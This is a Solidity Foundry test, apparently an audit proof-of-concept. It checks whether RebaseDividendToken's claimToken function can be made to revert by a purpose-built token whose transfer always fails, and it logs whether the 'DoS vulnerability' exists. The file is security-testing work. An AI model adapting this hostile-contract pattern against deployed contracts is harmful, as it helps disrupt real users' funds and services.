// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/RebaseDividendToken.sol";

contract MaliciousToken {
    string public name = "MaliciousToken";
    string public symbol = "MAL";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
    }

    function transfer(address, uint256) public pure returns (bool) {
        revert("Malicious token transfer failure");
    }
}

contract RebaseDividendToken_claimToken_DoS_Test is Test {
    RebaseDividendToken token;
    MaliciousToken maliciousToken;
    
    // Real addresses used in token constructor
    address private constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant USDT_ADDRESS = 0x55d398326f99059fF775485246999027B3197955;
    address private constant DUMMY_FACTORY = address(0xFAC70);
    address private constant DUMMY_PAIR = address(0xDEADBEEF);
    
    function setUp() public {
        maliciousToken = new MaliciousToken();
        
        // Mock PancakeSwap router responses
        vm.mockCall(
            PANCAKE_ROUTER,
            abi.encodeWithSignature("factory()"),
            abi.encode(DUMMY_FACTORY)
        );
        
        // Mock factory createPair response
        vm.mockCall(
            DUMMY_FACTORY,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(DUMMY_PAIR)
        );
        
        // Deploy main token contract after setting up mock responses
        token = new RebaseDividendToken();
    }

    function test_claimToken_Reverts_With_MaliciousToken() public {
        uint256 maliciousAmount = 100 ether;
        
        // Mint tokens to token contract address
        maliciousToken.mint(address(token), maliciousAmount);
        
        console.log("--- BEFORE-Trigger ---");
        console.log("State: Pre-attack state snapshot");
        console.log(" - MaliciousToken balance in RebaseDividendToken:", maliciousToken.balanceOf(address(token)));

        console.log("--- Trigger claimToken ---");
        console.log("Action: Attempt to claim malicious tokens (expected to revert)");
        
        bool success;
        string memory revertReason;
        bytes memory revertData;
        try token.claimToken(address(maliciousToken), maliciousAmount) {
            success = true;
        } catch Error(string memory reason) {
            revertReason = reason;
            success = false;
            revertData = bytes(reason);
        } catch (bytes memory data) {
            revertReason = "Low-level revert (without string)";
            revertData = data;
            success = false;
        }

        console.log("--- AFTER-Trigger ---");
        console.log("State: Post-attack state snapshot");
        console.log(" - MaliciousToken balance in RebaseDividendToken:", maliciousToken.balanceOf(address(token)));
        console.log(" - Claim function reverted:", !success);
        
        if (success) {
            console.log("Vulnerability not Exist: claimToken executed without revert");
        } else {
            bool matchedRevert = keccak256(abi.encodePacked(revertReason)) == keccak256(abi.encodePacked("Malicious token transfer failure"));
            console.log(" - Revert reason: '%s'", revertReason);
            console.log(" - Revert matches expected:", matchedRevert ? "YES" : "NO");
            
            if (matchedRevert) {
                console.log("Vulnerability Exists: DoS via malicious token transfer confirmed");
            } else {
                console.log("Vulnerability not Exist: Unexpected revert reason");
            }
        }
    }
}